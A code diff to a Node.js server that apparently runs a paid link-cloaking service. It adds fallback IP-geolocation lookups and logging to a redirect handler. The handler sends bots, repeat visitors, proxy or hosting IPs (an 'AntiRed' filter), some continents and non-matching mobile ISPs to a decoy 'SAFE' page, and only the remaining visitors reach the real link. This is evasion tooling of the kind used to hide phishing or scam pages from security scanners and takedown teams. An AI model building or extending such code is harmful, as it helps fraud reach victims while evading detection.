@@ -1102,7 +1102,9 @@ app.post('/api/payments/request', requireAuth, apiLimiter, asyncHandler(async (r
     });
 
     // Generate a unique decimal offset to avoid collisions for the same base amount
+    // REVERTED: Using base amount directly as we now require/rely on sending wallet registration.
     let finalAmt = baseAmt;
+    /*
     let attempts = 0;
     while (attempts < 50) {
         const offset = Math.floor(Math.random() * 50 + 1) / 100; // 0.01 to 0.50
@@ -1114,6 +1116,7 @@ app.post('/api/payments/request', requireAuth, apiLimiter, asyncHandler(async (r
         }
         attempts++;
     }
+    */
 
     const payment = {
         id: require('uuid').v4(),
@@ -1927,6 +1930,58 @@ async function lookupIpGeo(ip) {
             return data;
         }
 
+        // Fallback 3: freeipapi.com (HTTPS supported, 60 req/min)
+        const freeIpApiRes = await axios.get(`https://freeipapi.com/api/json/${encodeURIComponent(ip)}`, { timeout: 5000 })
+            .catch(e => {
+                console.warn(`[Proxy] freeipapi.com failed for ${ip}: ${e.message}`);
+                return null;
+            });
+
+        if (freeIpApiRes && freeIpApiRes.data && freeIpApiRes.data.ipAddress) {
+            const d = freeIpApiRes.data;
+            const data = {
+                status: 'success',
+                country: d.countryName || 'Unknown',
+                countryCode: d.countryCode || 'UN',
+                regionName: d.regionName || 'Unknown',
+                city: d.cityName || 'Unknown',
+                isp: d.asName || 'Unknown',
+                org: d.asName || 'Unknown',
+                proxy: !!d.isProxy,
+                hosting: false,
+                continentCode: 'UN',
+                query: ip
+            };
+            ipGeoCache.set(ip, { data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
+            return data;
+        }
+
+        // Fallback 4: ipapi.co (HTTPS supported, 1000/day free)
+        const ipapiCoRes = await axios.get(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { timeout: 5000 })
+            .catch(e => {
+                console.warn(`[Proxy] ipapi.co failed for ${ip}: ${e.message}`);
+                return null;
+            });
+
+        if (ipapiCoRes && ipapiCoRes.data && !ipapiCoRes.data.error) {
+            const d = ipapiCoRes.data;
+            const data = {
+                status: 'success',
+                country: d.country_name || 'Unknown',
+                countryCode: d.country_code || 'UN',
+                regionName: d.region || 'Unknown',
+                city: d.city || 'Unknown',
+                isp: d.org || 'Unknown',
+                org: d.org || 'Unknown',
+                proxy: false,
+                hosting: false,
+                continentCode: 'UN',
+                query: ip
+            };
+            ipGeoCache.set(ip, { data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
+            return data;
+        }
+
         console.error(`[Proxy] All IP lookup providers failed for ${ip}`);
         // Cache negative result briefly
         ipGeoCache.set(ip, { data: null, expiresAt: now + 60 * 1000 });
@@ -2059,26 +2114,32 @@ async function handleRedirection(user, req, res, linkData) {
     if (useBotFilter && isBot(req)) {
         targetUrl = nonRealLink;
         redirectReason = 'Bot Detection';
+        console.log(`[Proxy] Redirecting ${clientIp} to SAFE: Bot Detection (UA: ${userAgent})`);
     } else if (isVisited && !useReallowVisited) {
         targetUrl = nonRealLink;
         redirectReason = 'Repeated Visit';
+        console.log(`[Proxy] Redirecting ${clientIp} to SAFE: Repeated Visit`);
     } else if (useAntiRed && isSuspicious) {
         targetUrl = nonRealLink;
         redirectReason = `AntiRed (${isProxy ? 'Proxy' : ''}${isProxy && isHosting ? '+' : ''}${isHosting ? 'Hosting' : ''})`;
+        console.log(`[Proxy] Redirecting ${clientIp} to SAFE: AntiRed (Proxy:${isProxy}, Hosting:${isHosting})`);
     } else if (data && data.status === 'success') {
         const continent = data.continentCode; // 'AF', 'EU', 'NA', 'AS', 'SA', 'OC', 'AN'
         if (!useAllowAfrica && continent === 'AF') {
             targetUrl = nonRealLink;
             redirectReason = 'Continent Filter (Africa)';
+            console.log(`[Proxy] Redirecting ${clientIp} to SAFE: Continent Filter (Africa)`);
         } else if (!useAllowEurope && continent === 'EU') {
             targetUrl = nonRealLink;
             redirectReason = 'Continent Filter (Europe)';
+            console.log(`[Proxy] Redirecting ${clientIp} to SAFE: Continent Filter (Europe)`);
         } else if (useIspFilter) {
             const userISP = (data.isp || data.org || "").toUpperCase();
             const matches = (useMobileIsps || []).some(isp => isp && userISP.includes(isp.toUpperCase()));
             if (!matches) {
                 targetUrl = nonRealLink;
                 redirectReason = 'ISP Filter';
+                console.log(`[Proxy] Redirecting ${clientIp} to SAFE: ISP Filter (User ISP: ${userISP}, Allowed: ${useMobileIsps.join(', ')})`);
             }
         }
     }
